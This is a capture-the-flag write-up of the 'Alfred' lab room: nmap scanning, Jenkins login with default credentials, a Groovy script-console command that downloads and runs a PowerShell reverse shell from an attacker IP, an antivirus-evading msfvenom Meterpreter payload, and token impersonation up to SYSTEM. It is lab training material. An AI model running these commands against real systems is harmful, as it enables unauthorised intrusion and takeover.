# Room: Alfred
Difficulty: Easy

Objectives: Exploit Jenkins to gain an initial shell, then escalate your privileges by exploiting Windows authentication tokens.

## 🔍 Enumeration

First thing I did was to scan for open ports using:
``` bash
nmap -sC -sV -Pn TARGET_IP
```
Result:
``` bash
PORT     STATE SERVICE    VERSION
80/tcp   open  http       Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Site doesn't have a title (text/html).
3389/tcp open  tcpwrapped
|_ssl-date: 2026-03-17T06:02:13+00:00; +8s from scanner time.
| ssl-cert: Subject: commonName=alfred
| Not valid before: 2026-03-16T05:59:32
|_Not valid after:  2026-09-15T05:59:32
8080/tcp open  http       Jetty 9.4.z-SNAPSHOT
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
| http-robots.txt: 1 disallowed entry 
|_/
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
### Question 1: How many ports are open? (TCP only)
Answer: 3

## 🌐 Initial Access

I started visiting the two ports (80, 8080).

On port 80, I found that it is Bruce Wayne's death memorial site.

On port 8080, it is a login portal.

I logged in using common credentials:
``` bash
admin:admin
```
and it worked.

I found that the server was running Jenkins ver. 2.190.1.

## 🧨 Reverse Shell

I downloaded this script:
``` bash
https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
```
Then I ran a Python web server and started my listener.

In the Script Console, I ran this command:
``` groovy
def cmd = "powershell -ExecutionPolicy Bypass -NoP -c IEX(New-Object Net.WebClient).DownloadString('http://192.168.129.113:8000/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress 192.168.129.113 -Port 4444"
cmd.execute()
```
This gave me a reverse shell.

I grabbed the user.txt at:
``` bash
C:\Users\bruce\Desktop
```
## ⬆️ Privilege Escalation

To make privilege escalation easier, I switched to a Meterpreter shell.
### Generate Payload
``` bash
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=IP LPORT=PORT -f exe -o shell-name.exe
```
This payload generates an encoded x86 reverse TCP payload. Payloads are usually encoded to ensure that they are transmitted correctly and to evade antivirus products.
### Transfer Payload
``` powershell
powershell "(New-Object System.Net.WebClient).Downloadfile('http://your-thm-ip:8000/shell-name.exe','shell.exe')"
```
### Setup Listener
``` bash
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST your-thm-ip
set LPORT listening-port
run
```
### Execute Payload
``` powershell
Start-Process "shell.exe"
```
This should spawn a shell.
### Question: What is the final size of the exe payload that you generated?
Answer: 73802

## Token Impersonation

Next, I checked my privileges:
``` bash
whoami /priv
```
I found that SeImpersonatePrivilege is enabled.

I went back to Meterpreter and ran:
``` bash
BUILTIN\Administrators
BUILTIN\Users
NT AUTHORITY\Authenticated Users
NT AUTHORITY\NTLM Authentication
NT AUTHORITY\SERVICE
NT AUTHORITY\This Organization
NT SERVICE\AudioEndpointBuilder
NT SERVICE\CertPropSvc
NT SERVICE\CscService
NT SERVICE\iphlpsvc
NT SERVICE\LanmanServer
NT SERVICE\PcaSvc
NT SERVICE\Schedule
NT SERVICE\SENS
NT SERVICE\SessionEnv
NT SERVICE\TrkWks
NT SERVICE\UmRdpService
NT SERVICE\UxSms
NT SERVICE\Winmgmt
NT SERVICE\wuauserv
```
Then I typed: 
``` bash
impersonate_token "BUILTIN\Administrators"
```
Then:
``` bash
getuid
```
Now I am:
``` bash
NT AUTHORITY\SYSTEM
```
## ⚠️ Important Note (from challenge)

Even though you have a higher privileged token, you may not have the permissions of a privileged user. 
This is because Windows uses the primary token of the process, not the impersonated token, to determine permissions.

## Process Migration

To fix this, I migrated to a SYSTEM process.

First, I listed processes:
``` bash
ps
```
I found: 
``` bash
580   services.exe   x64   0   NT AUTHORITY\SYSTEM
```
Then I ran: 
``` bash
migrate 580
```
## Root Flag

After successful migration, I grabbed the flag at:
``` bash
C:\Windows\System32\config
```
